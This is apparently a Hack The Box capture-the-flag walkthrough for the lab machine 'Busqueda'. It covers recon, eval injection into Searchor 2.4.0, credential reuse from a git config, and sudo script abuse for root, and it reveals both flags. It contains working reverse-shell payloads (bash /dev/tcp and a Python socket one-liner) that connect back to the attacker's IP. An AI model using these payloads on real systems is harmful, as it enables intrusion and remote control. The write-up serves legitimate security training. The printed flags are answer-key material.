# Busqueda Walkthrough ![busqueda](https://github.com/securepadawan/Hack_The_Box/assets/66234098/9ba43378-389b-4aaa-8a46-bbff09ed722b)

# About 

- Operating System: Linux
- Point Value: 30 Total (20 System and 10 for User)
- Level: Easy
- Target IP Address: 10.129.138.207

# Vulnerabilities

- Reserve Shell Exploit

# Walkthrough
<br>

## HTB Pwnbox (Parrot) - User Flag

Open Terminal and then do an nmap scan. `nmap -sV 10.129.138.207`
![busqueda1](https://github.com/securepadawan/Hack_The_Box/assets/66234098/a6a57759-492e-4f63-8472-e121a7bd502f)
<br>
<br>

This nmap scan shows port 80 is open which we can use. When opening the browser go to `10.129.138.207` , it re-directs to `searcher.htb` . 
![busqueda2](https://github.com/securepadawan/Hack_The_Box/assets/66234098/f1c34be1-1e45-4428-abe2-2afab97db482)
<br>
<br>

It is necessary to modify the /etc/hosts. To do this, you will need to do `sudo nano /etc/hosts` and then add `10.129.138.207 searcher.htb`. 
![busqueda3](https://github.com/securepadawan/Hack_The_Box/assets/66234098/5eb73733-7430-4428-814e-597e5be55723)
<br>
<br>

*Note: If you try accessing /etc/hosts just by doing `nano /etc/hosts` to modify and save, you get a Permission denied message.*
![busqueda4](https://github.com/securepadawan/Hack_The_Box/assets/66234098/3c741791-f381-4908-9254-bd6a05359932)
<br>
<br>

After successfully exiting and saving /etc/hosts, go back to the browser and try accessing `10.129.138.207` again. The site comes up and shows the following:
![busqueda5](https://github.com/securepadawan/Hack_The_Box/assets/66234098/6a7b51ae-f489-4600-a09d-97f489fe304e)
<br>
<br>

When scrolling to the very bottom, I saw “Powered by Flash and Searchor 2.4.0”
![busqueda6](https://github.com/securepadawan/Hack_The_Box/assets/66234098/71a99b57-a2e6-4486-97d0-786b5e59ab2b)
<br>
<br>

When doing a search for “Searchor 2.40 exploit”, I found the following [GitHub](https://github.com/jonnyzar/POC-Searchor-2.4.2). I can then go back to my terminal and do a `git clone https://github.com/jonnyzar/POC-Searchor-2.4.2.git` .
![busqueda7](https://github.com/securepadawan/Hack_The_Box/assets/66234098/08b29339-84ca-4786-9a20-e9102ac18ffb)
<br>
<br>

After download complete, I can confirm by doing a `ls` and see POC-Searchor-2.4.2 is saved. I can then change directory (`cd POC-Searchor-2.4.2`) and run another `ls` to see the items listed there.
![busqueda8](https://github.com/securepadawan/Hack_The_Box/assets/66234098/319dafd4-bc05-420e-8770-79963e678742)
<br>
<br>

I can then did `cat [README.md](http://README.md)` to read the file. When reading the file, it mentions Python eval. 
![busqueda9](https://github.com/securepadawan/Hack_The_Box/assets/66234098/dcd87d17-e090-4c5c-b3a6-ae0284a7e2c5)
<br>
<br>

So I did some research and found a site that mentions [Arbitrary Code Execution](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/). I copied the code under Reverse Shell `__import('os').system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')`
![busqueda10](https://github.com/securepadawan/Hack_The_Box/assets/66234098/77c3822e-afde-46e2-ab9e-f6b41af41350)
<br>
<br>

I then had to modify this code by adding `'),` , modifying the IP address to `10.10.14.12` (which is my computer) and adding at the end a space and `#` . This is how the whole thing looked like: `'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.12/4444 0>&1"') #` . I found this by doing combinations of the Arbitrary Code Execution listed above the Reverse Shell.
![busqueda11](https://github.com/securepadawan/Hack_The_Box/assets/66234098/79c5f514-7672-4d62-879f-0a34d31110a1)
<br>
<br>

![busqueda12](https://github.com/securepadawan/Hack_The_Box/assets/66234098/1dc4f4cf-c484-428e-af47-48dd7207567f)
<br>
<br>

After typing in my terminal `nc -lvnp 4444` and then clicking “Search”, the following showed on my terminal. I also typed `whoami` to confirm.
![busqueda13](https://github.com/securepadawan/Hack_The_Box/assets/66234098/597a0a4b-11d7-4418-9b2f-7de81e39f9a1)
<br>
<br>

I then ran the following commands: `ls -la` `cd .git` `ls -la` 
![busqueda14](https://github.com/securepadawan/Hack_The_Box/assets/66234098/f7cd9005-f948-4da5-a2f1-3b736e290306)
<br>
<br>

After running `cat config` , I came across the following. `jh1usoih2bkjaspwe92` turns out is the password
![busqueda15](https://github.com/securepadawan/Hack_The_Box/assets/66234098/964c3cfa-4420-4e4e-87e8-3ab7434713c4)
<br>
<br>

I created a second terminal session and did `ssh svc@10.129.138.207` . When prompted for the ECDSA key fingerprint, typed`yes` . For the password, I put `jh1usoih2bkjaspwe92` .
![busqueda16](https://github.com/securepadawan/Hack_The_Box/assets/66234098/ceff25b5-b74d-4a28-a7cc-c4a7bb4b7dbc)
<br>
<br>

I used the command`whoami` to confirm.
<br>
![busqueda17](https://github.com/securepadawan/Hack_The_Box/assets/66234098/2bc5b580-ecdd-4b59-9467-feed52cacb8f)
<br>
<br>

When running `ls -la` , I saw the file `user.txt`. So I can `cat user.txt` and found the user flag.
![busqueda18](https://github.com/securepadawan/Hack_The_Box/assets/66234098/421103bf-1b95-479d-a2bf-013111f557ff)
<br>
<br>

## User Flag:
<details>
<summary> *Spoiler warning* </summary>
`8bae7d0bac9792fcb1a6fc7bedf96360`
</details>
<br>
<br>

## HTB Pwnbox (Parrot) - Root / System Flag

I went ahead and ran `sudo -l` to see check commands. I see the command `/usr/bin/python3 /opt/scripts/system-checkup.py *` and ran it. Again, it prompted for the password `jh1usoih2bkjaspwe92` .
![busqueda19](https://github.com/securepadawan/Hack_The_Box/assets/66234098/929fc509-6959-4e65-962c-20e3b867fd0d)
<br>
<br>

I ran the command `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *` and then the password `jh1usoih2bkjaspwe92` .
![busqueda20](https://github.com/securepadawan/Hack_The_Box/assets/66234098/0587ea85-3518-406a-9367-ab42fd75203a)
<br>
<br>

I ran `cd /opt/scripts` and `ls` and saw full-checkup.sh
![busqueda21](https://github.com/securepadawan/Hack_The_Box/assets/66234098/a35f9791-2cca-487c-887c-9b4c37b8f3d3)
<br>
<br>

I executed `cd -` and `touch [full-checkup.sh](http://full-checkup.sh)` to download the file.
![busqueda22](https://github.com/securepadawan/Hack_The_Box/assets/66234098/c24fab37-7e2f-40aa-a574-b251ee6ff9b5)
<br>
<br>

I research Python Privilege Escalation and found [this](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/) that executes a reverse shell.
`import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")` . I would need to modify to remove “<local-ip>” to replace it with my machine IP address.
![busqueda23](https://github.com/securepadawan/Hack_The_Box/assets/66234098/c5b140a9-50ab-42e4-88e1-f780327d1d17)
<br>
<br>

I opened another terminal (third one if you are counting) and ran `nano full-checkup.sh` to modify the file.
`#!/usr/bin/python3`
`import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")`
<br>
<br>
![busqueda24](https://github.com/securepadawan/Hack_The_Box/assets/66234098/891d0328-b234-45e5-bc27-637d2d827a18)
<br>
*Hint: If you don’t like nano, you can also use gedit. You may need to install it first by running `sudo apt-get install gedit` and then `gedit [full-checkup.sh](http://full-checkup.sh)` to modify the file.*
<br>
<br>

Once you save and exit, you will need to start a server by running `python -m http.server`
![busqueda25](https://github.com/securepadawan/Hack_The_Box/assets/66234098/c8b302a0-fd9a-40bf-a09c-6cbbd92cb553)
<br>
<br>

Switching back to the second terminal, you need to run a wget to pull the file. `wget http://10.10.14.12:8000/full-checkup.sh`
![busqueda26](https://github.com/securepadawan/Hack_The_Box/assets/66234098/56c0f3f0-751b-499d-9afe-c1ed2004a751)
<br>
<br>

You can see on the third terminal shows the `get`
![busqueda27](https://github.com/securepadawan/Hack_The_Box/assets/66234098/a35733d8-0fbf-40a3-8048-e6d0109df87e)
<br>
<br>

On the second terminal, need to modify the permission of the file using `chmod +x full-checkup.sh`
![busqueda28](https://github.com/securepadawan/Hack_The_Box/assets/66234098/5351fe82-55c5-4e60-aa3e-7eb2eb3592b0)
<br>
<br>

Now on the fourth terminal (don’t worry, this is the last one), I ran `sudo su` and `nc -lnvp 4444`
![busqueda29](https://github.com/securepadawan/Hack_The_Box/assets/66234098/246fe3e0-2c3c-4dee-99dd-025c5eca9adc)
<br>
<br>

I switched back to my second terminal and execute the command `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` . It again requested the password (same thing as above). 
![busqueda30](https://github.com/securepadawan/Hack_The_Box/assets/66234098/da3b43a9-40e7-4e05-97f0-821bd37e5240)
<br>
*Hint: If you get an error here, you didn’t something wrong.*
<br>
<br>

Switching back over to my fourth terminal, I have root@busqueda access. I also ran `whoami` to confirm. 
![busqueda31](https://github.com/securepadawan/Hack_The_Box/assets/66234098/15caf943-fbcc-4dbb-8323-2defd08aa7a2)
<br>
<br>

I then did `cd /root` , `ls -la` and saw the `root.txt` file. So I ran `cat root.txt` and got the root flag.
![busqueda32](https://github.com/securepadawan/Hack_The_Box/assets/66234098/373d7b3d-e863-4bfe-8013-b56b348ac7f7)
<br>
<br>

## Root / System Flag:
<details>
<summary> *Spoiler warning* </summary>
`4e40b0065928fb42069eb24c0c647ddc`
</details>
<br>
<br>

